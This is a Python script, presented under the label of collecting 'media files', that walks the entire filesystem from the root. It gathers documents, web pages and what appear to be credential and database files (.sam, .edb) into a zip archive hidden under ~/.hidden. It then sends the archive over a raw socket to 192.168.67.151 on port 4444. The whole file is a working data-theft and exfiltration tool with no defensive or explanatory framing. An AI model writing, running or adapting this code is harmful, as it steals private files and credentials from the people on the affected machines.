import os
import socket
import zipfile
import threading
from queue import Queue

# Get the root directory
root_directory = os.path.abspath('/')

# Set the media extensions to filter
media_extensions = {".mp3", ".mp4", ".wav", ".avi", ".jpg", ".jpeg", ".text", ".txt", ".sam", ".html", ".htm", ".edb"}

# Create a ZipFile object to save the media files to
zip_file_path = os.path.join(os.path.expanduser("~"), ".hidden", ".media_files.zip")
os.makedirs(os.path.dirname(zip_file_path), exist_ok=True)

# Create a queue for the media files
media_files_queue = Queue()

# Define a function to find media files
def find_media_files(root_directory, media_extensions, media_files_queue):
    for directory_path, directory_names, file_names in os.walk(root_directory):
        # Filter the files by extension
        media_files = [os.path.join(directory_path, file_name) for file_name in file_names if os.path.splitext(file_name)[1] in media_extensions]
        # Add the media files to the queue
        
        for media_file in media_files:
            media_files_queue.put(media_file)

# Define a function to add media files to the zip file
def add_media_files_to_zip(zip_file_path, media_files_queue):
    with zipfile.ZipFile(zip_file_path, 'w') as zip_file:
        while not media_files_queue.empty():
            media_file = media_files_queue.get()
            try:
                zip_file.write(media_file)
            except Exception as e:
                print(f"Error: {e}")

# Start a thread to find media files
find_media_files_thread = threading.Thread(target=find_media_files, args=(root_directory, media_extensions, media_files_queue))
find_media_files_thread.start()

# Start a thread to add media files to the zip file
add_media_files_to_zip_thread = threading.Thread(target=add_media_files_to_zip, args=(zip_file_path, media_files_queue))
add_media_files_to_zip_thread.start()

# Wait for both threads to finish
find_media_files_thread.join()
add_media_files_to_zip_thread.join()

print("Zip file created successfully")

# Send the zip file to a server
ip_address = '192.168.67.151'
port = 4444

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
    sock.connect((ip_address, port))
    with open(zip_file_path, 'rb') as file:
        buffer = file.read(1024)
        while buffer:
            sock.send(buffer)
            buffer = file.read(1024)

print("Zip file sent successfully")
